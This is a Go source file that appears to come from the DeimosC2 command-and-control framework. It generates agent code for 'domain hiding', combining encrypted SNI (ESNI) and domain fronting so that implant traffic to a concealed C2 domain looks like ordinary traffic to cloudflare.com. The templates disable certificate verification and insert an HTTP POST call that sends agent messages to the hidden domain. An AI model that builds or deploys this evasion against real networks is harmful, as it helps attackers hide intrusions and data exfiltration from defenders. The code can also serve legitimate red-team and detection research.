package httpstechniques

import (
	"strings"
)

//Variables for Domain Hiding
var (
	//Code from https://github.com/SixGenInc/Noctilucent/blob/master/DeimosC2/HTTPS_agent.go
	hiddenCodeMain string = `	
	esniKeysBytes, _ := domainhiding.QueryESNIKeysForHostDoH("cloudflare.com", true)
	esnikeys, _ := tls.ParseESNIKeys(esniKeysBytes)

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		ClientESNIKeys:     esnikeys,
		MinVersion:         tls.VersionTLS13, // Force TLS 1.3
		MaxVersion:         tls.VersionTLS13,
		ESNIServerName:     actualDomain,
		PreserveSNI:        true,
		ServerName:         frontDomain}

	pubKey = []byte(stringPubKey)
	var (
		conn *tls.Conn
	)

	var err error
	httpClient = &http.Client{
		Transport: &http.Transport{
			DialTLS: func(network, addr string) (net.Conn, error) {
				conn, err = tls.Dial("tcp", host+":"+port, tlsConfig)
				return conn, err
			},
		},
	}`

	//Imports required for domain hiding
	hiddenImports string = `
	"github.com/SixGenInc/Noctilucent/tls"
	"github.com/DeimosC2/DeimosC2/agents/resources/domainhiding"
	`

	//Dynamic variables required for domain hiding (aligned left)
	hiddenDynamicVariables string = `var frontDomain = "{{FRONTDOMAIN}}"
var actualDomain = "{{ACTUALDOMAIN}}"
var httpClient *http.Client
`

	//HTTP Post code for send message function required for domain hiding
	hiddenHTTPPostCall string = `httpClient.Post(("https://" + actualDomain + ":" + port + msgType), "application/json", bytes.NewBuffer(fullMessage))`
)

//StageDomainHiddenCode will dynamically create the code for the requested technique
func StageDomainHiddenCode(output string, frontDomainIP string, frontDomainPort string, frontDomain string, actualDomain string) string {
	//Start building the code
	output = strings.Replace(string(output), "{{DYNAMIC_IMPORTS}}", hiddenImports, -1)
	output = strings.Replace(string(output), "{{HOST}}", frontDomainIP, -1)
	output = strings.Replace(string(output), "{{PORT}}", frontDomainPort, -1)

	replaceVariables := strings.NewReplacer("{{FRONTDOMAIN}}", frontDomain, "{{ACTUALDOMAIN}}", actualDomain)
	output = strings.Replace(string(output), "{{DYNAMIC_VARIABLES}}", replaceVariables.Replace(hiddenDynamicVariables), -1)

	output = strings.Replace(string(output), "{{DYNAMIC_MAIN_CODE}}", hiddenCodeMain, -1)

	output = strings.Replace(string(output), "{{DYNAMIC_HTTP_POST_CALL}}", hiddenHTTPPostCall, -1)

	return output
}
